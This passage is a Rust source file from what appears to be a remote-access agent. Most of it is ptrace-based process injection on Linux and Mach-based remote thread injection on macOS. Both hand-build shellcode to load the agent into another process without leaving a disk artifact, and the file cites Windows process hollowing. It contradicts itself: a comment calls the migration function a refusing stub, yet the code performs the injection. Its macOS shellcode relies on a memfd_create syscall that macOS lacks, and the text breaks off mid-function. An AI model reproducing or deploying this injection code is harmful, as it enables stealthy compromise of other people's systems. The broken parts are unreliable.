//! Process management and load-balancing migration helpers.
//!
//! This module exposes a small, OS-agnostic API for enumerating processes and
//! migrating the agent into a long-running system process.
//!
//! Implementation status by platform:
//! * **Linux:** experimental and x86_64-only; uses ptrace+clone to inject a
//!   staged execve stub.  Returns explicit errors when ptrace prerequisites
//!   are missing (CAP_SYS_PTRACE or same-uid access).
//! * **macOS:** experimental; requires root or the
//!   `com.apple.security.cs.debugger` entitlement and returns explicit errors
//!   when platform prerequisites are not met.
//! * **Windows:** experimental via the shared `hollowing` crate and subject to
//!   target process permissions.
//!
//! Process *enumeration* is fully implemented and tested on all platforms.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use sysinfo::System;

// Windows-only process hollowing now lives in the shared `hollowing` crate.

/// A lightweight, serializable view over a process suitable for shipping back
/// to the operator console.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory_bytes: u64,
}

/// Snapshot the current process table.
pub fn list_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new_all();
    sys.refresh_all();
    sys.processes()
        .iter()
        .map(|(pid, p)| ProcessInfo {
            pid: pid.as_u32(),
            name: p.name().to_string(),
            cpu_usage: p.cpu_usage(),
            memory_bytes: p.memory(),
        })
        .collect()
}

/// Attempt to migrate the running agent into the address space of `target_pid`.
///
/// This is a deliberate **stub** in the public release: cross-process memory
/// rewriting is OS-specific (Windows: `NtUnmapViewOfSection` +
/// `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext`; Linux:
/// `ptrace(PTRACE_ATTACH)` + `process_vm_writev`) and carries enough
/// stability and security risk that we expose the API surface but refuse to
/// perform the operation until the implementation has had a thorough review.
#[cfg(target_os = "linux")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("invalid migration target (self or pid 0)");
    }

    {
        // Verify we have ptrace capability or same-uid access.
        let target_uid_path = format!("/proc/{target_pid}/status");
        let status = std::fs::read_to_string(&target_uid_path)
            .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
        let target_uid = status
            .lines()
            .find(|l| l.starts_with("Uid:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u32>().ok())
            .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
        let our_uid = unsafe { libc::getuid() };
        if our_uid != 0 && our_uid != target_uid {
            anyhow::bail!(
                "process migration requires CAP_SYS_PTRACE or same-uid access (our uid={our_uid}, target uid={target_uid})"
            );
        }

        unsafe {
            use std::mem::MaybeUninit;

            // ── Stage 1: Attach ───────────────────────────────────────────────
            if libc::ptrace(
                libc::PTRACE_ATTACH,
                target_pid as libc::pid_t,
                0usize,
                0usize,
            ) != 0
            {
                anyhow::bail!(
                    "PTRACE_ATTACH(pid={target_pid}) failed: {}",
                    std::io::Error::last_os_error()
                );
            }
            let mut wstatus: libc::c_int = 0;
            libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
            if !libc::WIFSTOPPED(wstatus) {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!(
                    "PTRACE_ATTACH: process did not stop as expected (wstatus={wstatus:#x})"
                );
            }

            // ── Stage 2: Save registers ───────────────────────────────────────
            #[cfg(target_arch = "x86_64")]
            let mut regs: libc::user_regs_struct = MaybeUninit::zeroed().assume_init();
            #[cfg(target_arch = "x86_64")]
            if libc::ptrace(
                libc::PTRACE_GETREGS,
                target_pid as libc::pid_t,
                0usize,
                &mut regs as *mut _ as usize,
            ) != 0
            {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!("PTRACE_GETREGS failed: {}", std::io::Error::last_os_error());
            }

            // ── Stage 3: Inject mmap syscall to allocate RW memory ───────────
            // We overwrite bytes at the current RIP with a `syscall; int3` sequence
            // to trigger a mmap(NULL, size, PROT_READ|PROT_WRITE,
            //                      MAP_PRIVATE|MAP_ANON, -1, 0)  (SYS_mmap = 9 on x86_64)
            // then singlestep and read RAX for the new mapping address.

            // ── Stage 2.5: Read agent binary into memory (no disk artifact) ───
            // We use memfd_create to hold the binary in an anonymous in-memory
            // file descriptor, then execve from /proc/self/fd/<n>.  No temporary
            // file is written to disk.
            let agent_path = std::env::current_exe()
                .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
            let agent_binary = std::fs::read(&agent_path).map_err(|e| {
                anyhow::anyhow!(
                    "failed to read agent binary {}: {e}",
                    agent_path.display()
                )
            })?;
            tracing::info!(
                "read agent binary ({} bytes) for memfd migration to pid {}",
                agent_binary.len(),
                target_pid
            );

            #[cfg(target_arch = "x86_64")]
            {
                // Save original 8 bytes at RIP so we can restore them.
                let orig_rip = regs.rip as usize;
                let orig_word = libc::ptrace(
                    libc::PTRACE_PEEKDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *const libc::c_void,
                    std::ptr::null::<libc::c_void>(),
                );
                // syscall (0F 05) + int3 (CC) + nops to fill 8 bytes
                let inject_word: u64 = 0xcc9090909090050f_u64; // LE: 0F 05 90 90 90 90 90 CC

                // Helper: inject a single syscall, wait for completion, return RAX.
                let mut run_syscall = |sys: u64,
                                       arg0: u64,
                                       arg1: u64,
                                       arg2: u64,
                                       arg3: u64,
                                       arg4: u64,
                                       arg5: u64|
                 -> Result<u64> {
                    // Write syscall;int3 at RIP.
                    libc::ptrace(
                        libc::PTRACE_POKEDATA,
                        target_pid as libc::pid_t,
                        orig_rip as *mut libc::c_void,
                        inject_word as *mut libc::c_void,
                    );
                    let mut sc_regs = regs;
                    sc_regs.rax = sys;
                    sc_regs.rdi = arg0;
                    sc_regs.rsi = arg1;
                    sc_regs.rdx = arg2;
                    sc_regs.r10 = arg3;
                    sc_regs.r8 = arg4;
                    sc_regs.r9 = arg5;
                    libc::ptrace(
                        libc::PTRACE_SETREGS,
                        target_pid as libc::pid_t,
                        0usize,
                        &sc_regs as *const _ as usize,
                    );
                    libc::ptrace(
                        libc::PTRACE_CONT,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    );
                    libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
                    let mut result_regs: libc::user_regs_struct =
                        MaybeUninit::zeroed().assume_init();
                    libc::ptrace(
                        libc::PTRACE_GETREGS,
                        target_pid as libc::pid_t,
                        0usize,
                        &mut result_regs as *mut _ as usize,
                    );
                    // Restore original bytes at RIP.
                    libc::ptrace(
                        libc::PTRACE_POKEDATA,
                        target_pid as libc::pid_t,
                        orig_rip as *mut libc::c_void,
                        orig_word as *mut libc::c_void,
                    );
                    Ok(result_regs.rax)
                };

                let detach_and_bail = |msg: String| -> Result<()> {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    );
                    anyhow::bail!("{msg}");
                };

                // ── Stage 3: mmap RW buffer large enough for the agent binary ──
                const SYS_MMAP: u64 = 9;
                const PROT_RW: u64 = 3; // PROT_READ|PROT_WRITE
                const MAP_PA: u64 = 0x22; // MAP_PRIVATE|MAP_ANON
                let alloc_size = ((agent_binary.len() + 4095) & !4095) as u64;

                let remote_buf = run_syscall(
                    SYS_MMAP,
                    0,          // addr = NULL
                    alloc_size, // length
                    PROT_RW,    // prot
                    MAP_PA,     // flags
                    u64::MAX,   // fd = -1
                    0,          // offset
                )?;
                if remote_buf == u64::MAX || remote_buf == 0 {
                    detach_and_bail(format!(
                        "remote mmap failed (returned {remote_buf:#x})"
                    ))?;
                    unreachable!()
                }

                // ── Stage 4: Write agent binary to remote buffer via process_vm_writev ──
                let local_iov = libc::iovec {
                    iov_base: agent_binary.as_ptr() as *mut _,
                    iov_len: agent_binary.len(),
                };
                let remote_iov = libc::iovec {
                    iov_base: remote_buf as *mut _,
                    iov_len: agent_binary.len(),
                };
                let written = libc::process_vm_writev(
                    target_pid as libc::pid_t,
                    &local_iov,
                    1,
                    &remote_iov,
                    1,
                    0,
                );
                if written < 0 {
                    detach_and_bail(format!(
                        "process_vm_writev failed: {}",
                        std::io::Error::last_os_error()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4a: memfd_create("", MFD_CLOEXEC) in target ─────────
                // SYS_memfd_create = 319 on x86_64 Linux.
                const SYS_MEMFD_CREATE: u64 = 319;
                const MFD_CLOEXEC: u64 = 1;
                // The name argument is a pointer to an empty string in the target's
                // buffer.  We write a single NUL byte at offset 0 of remote_buf
                // (the beginning of the agent binary which we already copied to the
                // memfd — the kernel doesn't read from this address until memfd_create
                // returns, so it's safe to reuse).  Actually, we need a valid pointer
                // to "".  We use the start of the mmap'd buffer — the first byte of
                // an ELF binary is 0x7f, not NUL.  Instead, we write a NUL byte to
                // a known location using process_vm_writev.
                let nul_byte = [0u8; 1];
                let nul_iov = libc::iovec {
                    iov_base: nul_byte.as_ptr() as *mut _,
                    iov_len: 1,
                };
                // Place the NUL at alloc_size - 1 (last byte of the mmap'd region).
                let nul_addr = remote_buf as usize + alloc_size as usize - 1;
                let nul_remote_iov = libc::iovec {
                    iov_base: nul_addr as *mut _,
                    iov_len: 1,
                };
                libc::process_vm_writev(
                    target_pid as libc::pid_t,
                    &nul_iov,
                    1,
                    &nul_remote_iov,
                    1,
                    0,
                );

                let memfd_fd = run_syscall(
                    SYS_MEMFD_CREATE,
                    nul_addr as u64, // name → "" (NUL byte)
                    MFD_CLOEXEC,
                    0,
                    0,
                    0,
                    0,
                )?;
                let memfd_fd = memfd_fd as i32;
                if memfd_fd < 0 {
                    detach_and_bail(format!(
                        "remote memfd_create failed (returned {memfd_fd})"
                    ))?;
                    unreachable!()
                }

                // ── Stage 4b: write(fd, remote_buf, binary_len) — copy binary to memfd ──
                const SYS_WRITE: u64 = 1;
                let write_result = run_syscall(
                    SYS_WRITE,
                    memfd_fd as u64,            // fd
                    remote_buf,                 // buf (agent binary)
                    agent_binary.len() as u64,  // count
                    0,
                    0,
                    0,
                )?;
                let bytes_written = write_result as i64;
                if bytes_written < 0 || (bytes_written as usize) != agent_binary.len() {
                    detach_and_bail(format!(
                        "remote write to memfd failed (returned {bytes_written}, expected {})",
                        agent_binary.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4c: Build execve stub for /proc/self/fd/<fd> ────────
                let fd_path = format!("/proc/self/fd/{memfd_fd}");
                let payload = build_execve_stub(std::path::Path::new(&fd_path))?;

                // Overwrite beginning of remote_buf with the execve stub
                // (the binary is safely stored in the memfd now).
                let stub_iov = libc::iovec {
                    iov_base: payload.as_ptr() as *mut _,
                    iov_len: payload.len(),
                };
                let stub_remote_iov = libc::iovec {
                    iov_base: remote_buf as *mut _,
                    iov_len: payload.len(),
                };
                let stub_written = libc::process_vm_writev(
                    target_pid as libc::pid_t,
                    &stub_iov,
                    1,
                    &stub_remote_iov,
                    1,
                    0,
                );
                if stub_written < 0 {
                    detach_and_bail(format!(
                        "process_vm_writev (stub) failed: {}",
                        std::io::Error::last_os_error()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4.5: Transition mapped pages from RW to RX via mprotect ──
                const SYS_MPROTECT: u64 = 10;
                const PROT_RX: u64 = 5; // PROT_READ|PROT_EXEC
                let mprot_result = run_syscall(
                    SYS_MPROTECT,
                    remote_buf,
                    alloc_size,
                    PROT_RX,
                    0,
                    0,
                    0,
                )?;
                if mprot_result != 0 {
                    detach_and_bail(format!(
                        "remote mprotect failed (returned {:#x})",
                        mprot_result
                    ))?;
                    unreachable!()
                }

                // ── Stage 5: Inject clone — new thread runs the execve stub ────
                // The stub calls execve("/proc/self/fd/<fd>", NULL, NULL) which
                // exec-replaces the target with the agent binary from the memfd.
                const SYS_CLONE: u64 = 56;
                const CLONE_FLAGS: u64 = 0x3D0F00;
                let stack_top = remote_buf as usize + (alloc_size as usize / 2) + 0x4000;

                // Write syscall;int3 at RIP for the clone.
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    inject_word as *mut libc::c_void,
                );
                let mut clone_regs = regs;
                clone_regs.rax = SYS_CLONE;
                clone_regs.rdi = CLONE_FLAGS;
                clone_regs.rsi = stack_top as u64;
                clone_regs.rdx = 0;
                clone_regs.r10 = 0;
                clone_regs.r8 = 0;
                // Set RIP = remote_buf so the child starts at the execve stub.
                clone_regs.rip = remote_buf;

                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &clone_regs as *const _ as usize,
                );
                libc::ptrace(
                    libc::PTRACE_CONT,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);

                // Restore original bytes and original registers.
                libc::ptrace(
                    libc::PTRACE_POKEDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *mut libc::c_void,
                    orig_word as *mut libc::c_void,
                );
                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &regs as *const _ as usize,
                );

                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                tracing::info!(
                    target_pid,
                    remote_buf = remote_buf as usize,
                    memfd_fd,
                    "MigrateAgent: execve stub injected via ptrace+memfd+clone on Linux x86_64"
                );
            }

            #[cfg(not(target_arch = "x86_64"))]
            {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!("Linux process migration via ptrace+clone is only implemented for x86_64");
            }

            Ok(())
        }
    }
}

/// Build a small, fully position-independent shellcode stub that calls
/// `execve(staged_path, NULL, NULL)` and falls through to `exit_group(1)`.
/// The path string is appended immediately after the machine-code so the
/// stub is entirely self-contained and can be injected as a single flat blob.
///
/// The stub is generated at runtime so the path length can vary.
#[cfg(target_os = "linux")]
fn build_execve_stub(path: &std::path::Path) -> anyhow::Result<Vec<u8>> {
    use std::os::unix::ffi::OsStrExt;
    let path_bytes = path.as_os_str().as_bytes();
    if path_bytes.contains(&0u8) {
        anyhow::bail!("staged path contains a null byte: {}", path.display());
    }

    #[cfg(target_arch = "x86_64")]
    {
        // Code layout (32 bytes):
        //  [0] 48 8D 3D 19 00 00 00  lea rdi, [rip+25]  → path string at offset 32
        //  [7] 48 31 F6              xor rsi, rsi        → argv=NULL
        // [10] 48 31 D2              xor rdx, rdx        → envp=NULL
        // [13] B8 3B 00 00 00        mov eax, 59         → SYS_execve
        // [18] 0F 05                 syscall
        // [20] BF 01 00 00 00        mov edi, 1          → exit_group arg
        // [25] B8 E7 00 00 00        mov eax, 231        → SYS_exit_group
        // [30] 0F 05                 syscall
        // [32] <path bytes> \0
        const CODE_SIZE: usize = 32;
        let rel: i32 = CODE_SIZE as i32 - 7; // RIP-relative offset for the lea
        let mut stub = vec![0x48, 0x8D, 0x3D];
        stub.extend_from_slice(&rel.to_le_bytes());
        stub.extend_from_slice(&[
            0x48, 0x31, 0xF6, // xor rsi, rsi
            0x48, 0x31, 0xD2, // xor rdx, rdx
            0xB8, 0x3B, 0x00, 0x00, 0x00, // mov eax, 59
            0x0F, 0x05, // syscall
            0xBF, 0x01, 0x00, 0x00, 0x00, // mov edi, 1
            0xB8, 0xE7, 0x00, 0x00, 0x00, // mov eax, 231
            0x0F, 0x05, // syscall
        ]);
        debug_assert_eq!(stub.len(), CODE_SIZE);
        stub.extend_from_slice(path_bytes);
        stub.push(0);
        Ok(stub)
    }

    #[cfg(target_arch = "aarch64")]
    {
        // Code layout (32 bytes):
        //  [0]  00 01 00 10  adr x0, #32   → path string at offset 32
        //  [4]  01 00 80 D2  movz x1, #0   → argv=NULL
        //  [8]  02 00 80 D2  movz x2, #0   → envp=NULL
        // [12]  A8 1B 80 D2  movz x8, #221 → SYS_execve (aarch64)
        // [16]  01 00 00 D4  svc #0
        // [20]  20 00 80 D2  movz x0, #1   → exit_group arg
        // [24]  C8 0B 80 D2  movz x8, #94  → SYS_exit_group (aarch64)
        // [28]  01 00 00 D4  svc #0
        // [32]  <path bytes> \0
        let stub = vec![
            0x00, 0x01, 0x00, 0x10, // adr x0, #32
            0x01, 0x00, 0x80, 0xD2, // movz x1, #0
            0x02, 0x00, 0x80, 0xD2, // movz x2, #0
            0xA8, 0x1B, 0x80, 0xD2, // movz x8, #221 (execve)
            0x01, 0x00, 0x00, 0xD4, // svc #0
            0x20, 0x00, 0x80, 0xD2, // movz x0, #1
            0xC8, 0x0B, 0x80, 0xD2, // movz x8, #94 (exit_group)
            0x01, 0x00, 0x00, 0xD4, // svc #0
        ];
        let mut out = stub;
        out.extend_from_slice(path_bytes);
        out.push(0);
        Ok(out)
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    anyhow::bail!("build_execve_stub: unsupported architecture")
}

#[cfg(target_os = "macos")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    use std::os::unix::ffi::OsStrExt;

    tracing::info!("MigrateAgent invoked for macOS pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("Cannot migrate to system idle or self on macOS");
    }

    // task_for_pid requires that the caller is root OR holds the
    // com.apple.security.cs.debugger entitlement.  We check early to give a
    // clear diagnostic rather than a cryptic KERN_FAILURE.
    let our_uid = unsafe { libc::getuid() };
    if our_uid != 0 {
        anyhow::bail!(
            "macOS process migration requires root or com.apple.security.cs.debugger entitlement \
             (current uid={})",
            our_uid
        );
    }

    // Read the agent binary into memory.  We inject it into the target process
    // alongside a memfd+execve shellcode stub — no disk staging needed.
    let agent_path =
        std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
    let agent_binary = std::fs::read(&agent_path).map_err(|e| {
        anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
    })?;
    tracing::info!(
        "read agent binary ({} bytes) for memfd migration",
        agent_binary.len()
    );

    // The shellcode stub is built after we know the address of the binary data
    // in the target process.  See the architecture-specific blocks below.

    // --- Mach API declarations ---
    // mach_port_t is u32 on both arm64 and x86_64 macOS.
    #[allow(non_camel_case_types)]
    type mach_port_t = u32;
    #[allow(non_camel_case_types)]
    type kern_return_t = i32;
    #[allow(non_camel_case_types)]
    type mach_vm_address_t = u64;
    #[allow(non_camel_case_types)]
    type mach_vm_size_t = u64;
    const KERN_SUCCESS: kern_return_t = 0;
    const VM_FLAGS_ANYWHERE: i32 = 1;
    const VM_PROT_READ: i32 = 1;
    const VM_PROT_WRITE: i32 = 2;
    const VM_PROT_EXECUTE: i32 = 4;

    extern "C" {
        fn mach_task_self() -> mach_port_t;
        fn task_for_pid(host: mach_port_t, pid: i32, task: *mut mach_port_t) -> kern_return_t;
        fn mach_vm_allocate(
            task: mach_port_t,
            addr: *mut mach_vm_address_t,
            size: mach_vm_size_t,
            flags: i32,
        ) -> kern_return_t;
        fn mach_vm_write(
            task: mach_port_t,
            address: mach_vm_address_t,
            data: *const u8,
            data_cnt: u32,
        ) -> kern_return_t;
        fn mach_vm_protect(
            task: mach_port_t,
            address: mach_vm_address_t,
            size: mach_vm_size_t,
            set_maximum: bool,
            new_protection: i32,
        ) -> kern_return_t;
        fn mach_port_deallocate(task: mach_port_t, name: mach_port_t) -> kern_return_t;
    }

    // x86_64 thread state
    #[cfg(target_arch = "x86_64")]
    {
        const x86_THREAD_STATE64: u32 = 4;
        const x86_THREAD_STATE64_COUNT: u32 = 42;

        #[repr(C)]
        #[derive(Default)]
        struct X86ThreadState64 {
            rax: u64,
            rbx: u64,
            rcx: u64,
            rdx: u64,
            rdi: u64,
            rsi: u64,
            rbp: u64,
            rsp: u64,
            r8: u64,
            r9: u64,
            r10: u64,
            r11: u64,
            r12: u64,
            r13: u64,
            r14: u64,
            r15: u64,
            rip: u64,
            rflags: u64,
            cs: u64,
            fs: u64,
            gs: u64,
            // padding to hit 42 u32-words = 168 bytes = 21 u64
            _pad: u64,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            // 1. Allocate RW region for the agent binary data.
            let mut binary_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut binary_addr,
                agent_binary.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
            }

            // 2. Write the agent binary.
            let kr = mach_vm_write(
                target_task,
                binary_addr,
                agent_binary.as_ptr(),
                agent_binary.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
            }

            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());

            // 4. Allocate RW region for the shellcode.
            let mut code_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut code_addr,
                shellcode.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
            }

            // 5. Write the shellcode.
            let kr = mach_vm_write(
                target_task,
                code_addr,
                shellcode.as_ptr(),
                shellcode.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
            }

            // 6. Protect the code region to RX.
            let kr = mach_vm_protect(
                target_task,
                code_addr,
                shellcode.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            // 7. Create a new thread whose initial RIP points at the shellcode.
            //    The shellcode performs: memfd_create → write(fd, binary, len) →
            //    format /dev/fd/N → execve → exit(1) fallback.
            let mut state = X86ThreadState64::default();
            state.rip = code_addr;
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            state.rsp = (stack_addr + stack_size - 8) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                x86_THREAD_STATE64,
                &state as *const _ as *const u32,
                x86_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running failed: kern_return={kr}");
            }
            mach_port_deallocate(mach_task_self(), new_thread);
            tracing::info!(
                target_pid,
                "MigrateAgent: memfd migration thread created via Mach API (x86_64)"
            );
            Ok(())
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        const ARM_THREAD_STATE64: u32 = 6;
        const ARM_THREAD_STATE64_COUNT: u32 = 68;

        #[repr(C)]
        #[derive(Default)]
        struct ArmThreadState64 {
            x: [u64; 29], // x0..x28
            fp: u64,      // x29 / frame pointer
            lr: u64,      // x30 / link register
            sp: u64,      // stack pointer
            pc: u64,      // program counter
            cpsr: u32,    // CPSR
            _pad: u32,
        }

        extern "C" {
            fn thread_create_running(
                task: mach_port_t,
                flavor: u32,
                new_state: *const u32,
                new_state_cnt: u32,
                child_thread: *mut mach_port_t,
            ) -> kern_return_t;
        }

        unsafe {
            let host = mach_task_self();
            let mut target_task: mach_port_t = 0;
            let kr = task_for_pid(host, target_pid as i32, &mut target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("task_for_pid(pid={target_pid}) failed: kern_return={kr}");
            }

            // 1. Allocate RW region for the agent binary data.
            let mut binary_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut binary_addr,
                agent_binary.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(binary) failed: kern_return={kr}");
            }

            // 2. Write the agent binary.
            let kr = mach_vm_write(
                target_task,
                binary_addr,
                agent_binary.as_ptr(),
                agent_binary.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(binary) failed: kern_return={kr}");
            }

            // 3. Build memfd+execve shellcode with binary_addr and binary_len embedded.
            let shellcode = build_macos_memfd_stub(binary_addr, agent_binary.len());

            // 4. Allocate RW region for the shellcode.
            let mut code_addr: mach_vm_address_t = 0;
            let kr = mach_vm_allocate(
                target_task,
                &mut code_addr,
                shellcode.len() as u64,
                VM_FLAGS_ANYWHERE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_allocate(code) failed: kern_return={kr}");
            }

            // 5. Write the shellcode.
            let kr = mach_vm_write(
                target_task,
                code_addr,
                shellcode.as_ptr(),
                shellcode.len() as u32,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_write(code) failed: kern_return={kr}");
            }

            // 6. Protect the code region to RX.
            let kr = mach_vm_protect(
                target_task,
                code_addr,
                shellcode.len() as u64,
                false,
                VM_PROT_READ | VM_PROT_EXECUTE,
            );
            if kr != KERN_SUCCESS {
                mach_port_deallocate(host, target_task);
                anyhow::bail!("mach_vm_protect(RX) failed: kern_return={kr}");
            }

            // 7. Create a new thread whose initial PC points at the shellcode.
            let mut state = ArmThreadState64::default();
            state.pc = code_addr;
            let stack_size: mach_vm_size_t = 8 * 1024 * 1024;
            let mut stack_addr: mach_vm_address_t = 0;
            mach_vm_allocate(target_task, &mut stack_addr, stack_size, VM_FLAGS_ANYWHERE);
            mach_vm_protect(
                target_task,
                stack_addr,
                stack_size,
                false,
                VM_PROT_READ | VM_PROT_WRITE,
            );
            state.sp = (stack_addr + stack_size) & !15;

            let mut new_thread: mach_port_t = 0;
            let kr = thread_create_running(
                target_task,
                ARM_THREAD_STATE64,
                &state as *const _ as *const u32,
                ARM_THREAD_STATE64_COUNT,
                &mut new_thread,
            );
            mach_port_deallocate(host, target_task);
            if kr != KERN_SUCCESS {
                anyhow::bail!("thread_create_running(arm64) failed: kern_return={kr}");
            }
            mach_port_deallocate(mach_task_self(), new_thread);
            tracing::info!(
                target_pid,
                "MigrateAgent: memfd migration thread created via Mach API (aarch64)"
            );
            Ok(())
        }
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = (&agent_binary, target_pid);
        anyhow::bail!("macOS migration not implemented for this architecture")
    }
}

/// Build a position-independent shellcode stub that performs memfd-based
/// process migration on macOS.
///
/// The stub executes the following syscall sequence:
///   1. memfd_create("", MFD_CLOEXEC)  → fd
///   2. write(fd, binary_addr, binary_len)
///   3. Build "/dev/fd/NNN" path on the stack via itoa
///   4. execve("/dev/fd/NNN", NULL, NULL)
///   5. exit(1) if execve fails
#[cfg(target_os = "macos")]
fn build_macos_memfd_stub(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    #[cfg(target_arch = "x86_64")]
    {
        build_macos_memfd_stub_x86_64(binary_addr, binary_len)
    }
    #[cfg(target_arch = "aarch64")]
    {
        build_macos_memfd_stub_aarch64(binary_addr, binary_len)
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    {
        let _ = (binary_addr, binary_len);
        Vec::new()
    }
}

/// macOS x86_64 memfd+execve shellcode.
/// Uses BSD syscall ABI: syscall number in rax | 0x2000000.
#[cfg(all(target_os = "macos", target_arch = "x86_64"))]
fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
    let mut code = Vec::new();

    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
    // push 0 (NUL terminator for empty string name)
    code.extend_from_slice(&[0x6a, 0x00]);
    // mov rdi, rsp (name = "")
    code.extend_from_slice(&[0x48, 0x89, 0xe7]);
    // mov esi, 1 (MFD_CLOEXEC)
    code.extend_from_slice(&[0xbe, 0x01, 0x00, 0x00, 0x00]);
    // mov rax, 0x2000000 + 518 (SYS_memfd_create)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 518).to_le_bytes());
    // syscall
    code.extend_from_slice(&[0x0f, 0x05]);
    // mov r12, rax (save fd)
    code.extend_from_slice(&[0x49, 0x89, 0xc4]);

    // === Step 2: write(fd, binary_addr, binary_len) ===
    // mov rdi, r12 (fd)
    code.extend_from_slice(&[0x4c, 0x89, 0xe7]);
    // mov rsi, binary_addr
    code.extend_from_slice(&[0x48, 0xbe]);
    code.extend_from_slice(&binary_addr.to_le_bytes());
    // mov rdx, binary_len
    code.extend_from_slice(&[0x48, 0xba]);
    code.extend_from_slice(&(binary_len as u64).to_le_bytes());
    // mov rax, 0x2000000 + 4 (SYS_write)
    code.extend_from_slice(&[0x48, 0xb8]);
    code.extend_from_slice(&(0x2000000u64 + 4).to_le_bytes());
    // syscall
